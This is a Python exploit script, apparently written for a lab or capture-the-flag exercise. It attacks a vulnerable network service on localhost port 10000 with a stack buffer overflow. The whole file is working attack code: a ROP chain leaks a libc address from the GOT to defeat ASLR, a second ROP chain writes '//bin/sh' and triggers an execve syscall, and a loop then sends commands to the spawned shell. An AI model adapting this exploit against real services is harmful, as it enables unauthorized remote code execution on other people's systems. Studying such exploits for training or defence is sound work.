import sys 
from struct import pack
import socket
from pwn import remote
import signal 

# first: read from the got by letting the server write its content
# second: get a shell 

def signal_handler(sig, frame):
    print("Exiting ...")
    exit()

signal.signal(signal.SIGINT, signal_handler)

p = lambda x : pack('Q', x)
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

port = 10000
offset_to_rip = 0x30 + 8
got = 0x4033b8
gadget1 = 0x00000000004014c1 #: pop rsi; pop r15; ret;
dummy = b'B'*8
write_plt = 0x0000000000401040

with socket.socket() as s:
    s.connect(("localhost", port))

    buf = b"A"*offset_to_rip
    buf += p(gadget1)
    buf += p(got)
    buf += dummy
    buf += p(write_plt)

    s.send(buf)
    b = s.recv(500)
    b = b[len(buf):]
    setsockopt_address = b[:8]
    print("Setsockopt address retrieved")

setsockopt_offset = 0x00000000001238a0 # in standard library
libc_base_address = int.from_bytes(setsockopt_address, "little") - setsockopt_offset
print("Libc base address: {}".format(hex(libc_base_address)))

with remote("localhost", port) as conn:

    print("Sending ROP chain for shell ...")

    IMAGE_BASE_0 = libc_base_address # 4db473e38da06f7b1ad54ef117a184e08ffda27bbbb5329d03831186e3e533c8

    """

    print("Waiting for you to attach to new child with gdb. Use pstree. Press any key")
    wait = input()
    OK, sh is executed..

    """
    # ROPPER generated

    rop = b'A'*offset_to_rip

    rop += rebase_0(0x000000000002911d) # 0x000000000002911d: pop r13; ret; 
    rop += b'//bin/sh'
    rop += rebase_0(0x00000000000331ff) # 0x00000000000331ff: pop rbx; ret; 
    rop += rebase_0(0x00000000001eb1a0)
    rop += rebase_0(0x0000000000064075) # 0x0000000000064075: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += rebase_0(0x000000000002911d) # 0x000000000002911d: pop r13; ret; 
    rop += p(0x0000000000000000)
    rop += rebase_0(0x00000000000331ff) # 0x00000000000331ff: pop rbx; ret; 
    rop += rebase_0(0x00000000001eb1a8)
    rop += rebase_0(0x0000000000064075) # 0x0000000000064075: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += rebase_0(0x0000000000026b72) # 0x0000000000026b72: pop rdi; ret; 
    rop += rebase_0(0x00000000001eb1a0)
    rop += rebase_0(0x0000000000027529) # 0x0000000000027529: pop rsi; ret; 
    rop += rebase_0(0x00000000001eb1a8)
    rop += rebase_0(0x000000000011c371) # 0x000000000011c371: pop rdx; pop r12; ret; 
    rop += rebase_0(0x00000000001eb1a8)
    rop += p(0xdeadbeefdeadbeef)
    rop += rebase_0(0x000000000004a550) # 0x000000000004a550: pop rax; ret; 
    rop += p(0x000000000000003b)
    rop += rebase_0(0x0000000000066229) # 0x0000000000066229: syscall; ret; 

    conn.send(rop)
    conn.recv(len(rop))
    
    # Why this doesn't work? (socket version)
    """
    while True:
        command = input("$ ")
        s.send(command.encode())
        print(s.recv(1024).decode())
    """
    while True:
        command = input("$ ")
        conn.send(command.encode())
        print(conn.recv(4096).decode())
